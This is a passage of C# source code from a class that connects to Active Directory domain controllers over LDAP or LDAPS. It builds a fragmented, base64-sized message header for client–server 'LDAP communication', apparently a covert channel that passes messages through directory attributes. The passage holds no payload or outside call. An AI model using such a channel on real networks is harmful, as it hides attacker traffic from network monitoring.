            DirectoryEntry dirEntry = remote ? this.remoteDirectoryEntry : this.DirectoryEntry;


            try
            {
                dirEntry.RefreshCache();
                var dirSearcher = new DirectorySearcher(dirEntry);
                dirSearcher.PropertiesToLoad.Add(attributeName);
                var res = dirSearcher.FindOne();
                var resultString = res.Properties[attributeName][0].ToString();

                result = string.IsNullOrEmpty(resultString);
            }
            catch (Exception ex)
            {
                if (ex.Message.StartsWith("Index was out of range."))
                    return true;
                else
                {
                    //   throw ex; // don't know what to do yet
                    result = false;
                }
            }
            //dirEntry.Dispose();
            return result;
        }

        /// <summary>
        /// Logic to create the header for LDAP communication
        /// </summary>
        /// <returns></returns>
        private StringBuilder CreateHeader()
        {
            int type  = (this.IsClient) ? 1 : 0;
            string id = Misc.GenerateId();

            this.ID = id;
            this.Type = type;

            var sBuilder = new StringBuilder();
            sBuilder.AppendLine($"Type:{type}");
            sBuilder.AppendLine($"ID:{id}");
            sBuilder.AppendLine("Parts:{0}");
            sBuilder.AppendLine("MessageID:{1}");
            sBuilder.AppendLine("Message:{2}");

            // Write down the base64 header length
            this.HeaderLength = (int)Math.Ceiling((decimal)sBuilder.ToString().Length / 3) * 4;
            //this.HeaderLength = Misc.Base64Encode(Encoding.ASCII.GetBytes(sBuilder.ToString())).Length;

            // Add +12 to reserve space for the partsnumbers up to 1000/1000
            this.HeaderLength += 12;

            // Add +5 to reserve space for messageID of 5 bytes
            this.HeaderLength += 5;

            return sBuilder;
        }

        /// <summary>
        /// Retrieves name of a rnadom domain controller
        /// </summary>
        /// <returns></returns>
        private List<string> getDomainControllerNames()
        {
            List<string> result = new List<string>();

            var ctx = GetDirectoryContext(DirectoryContextType.Domain);

            // Fetch a static domain controller to avoid replication and latency issues
            Domain domain = Domain.GetDomain(ctx);
            var domainControllers = domain.DomainControllers;

            foreach (DomainController dc in domainControllers)
            {
                result.Add(dc.Name);
            }

            //result = domain.DomainControllers[0].Name;
            //result = domain.PdcRoleOwner.Name;

            // cleanup            
            domain.Dispose();
            ctx = null;

            return result;
        }

        /// <summary>
        /// Returns distinguishedname of the target domain
        /// </summary>
        /// <returns></returns>
        private string getDomainDistinguishedName()
        {

            string result = string.Empty;
            var ctx = GetDirectoryContext(DirectoryContextType.Domain);
          
            Domain domain = Domain.GetDomain(ctx);

            result = domain.GetDirectoryEntry().Path.Split('/').Last();

            // cleanup
            domain.Dispose();
            ctx = null;

            return result;

        }
     
        /// <summary>
        /// returns authenticated DirectoryEntry based on provided information
        /// </summary>
        /// <returns></returns>
        private DirectoryEntry getDirEntry(string distinguishedName = null)
        {
            string dn        = string.IsNullOrEmpty(distinguishedName) ? this.domainDistinguishedName : distinguishedName;
            //string protocol  = this.UseLDAPS ? "LDAPS://" : "LDAP://";
            //string toConnect = "LDAPS://" + this.domainController + "/" + dn;

            string toConnect = "LDAP://" + this.domainController;
            if (this.UseLDAPS)
                toConnect += ":636";

            // Add DN to connectionString
            toConnect += "/" + dn;

            DirectoryEntry dirEntry;
            if (useIntegratedAuth)
            {
                dirEntry = new DirectoryEntry(toConnect);
            } else
            {
                dirEntry = new DirectoryEntry(toConnect, username, password);
            }

            return dirEntry;

        }

        /// <summary>
        /// extracts username and domain from  user provided input        
        /// </summary>
        private void extractUsernames()
        {
            if (username.Contains("\\"))
            {
                this.username = username.Split('\\')[1];

                if (string.IsNullOrEmpty(this.domain))
                    this.domain = username.Split('\\')[0];
            }
        }

        /// <summary>
        /// Extracts user domain name
        /// </summary>
        private void getDomainName()
        {
            this.domain = System.Environment.UserDomainName;
        }

        /// <summary>
        /// Extract user name
        /// </summary>
        private void getUserName()
        {
            this.username = System.Environment.UserName;
        }
        #endregion

    }
}
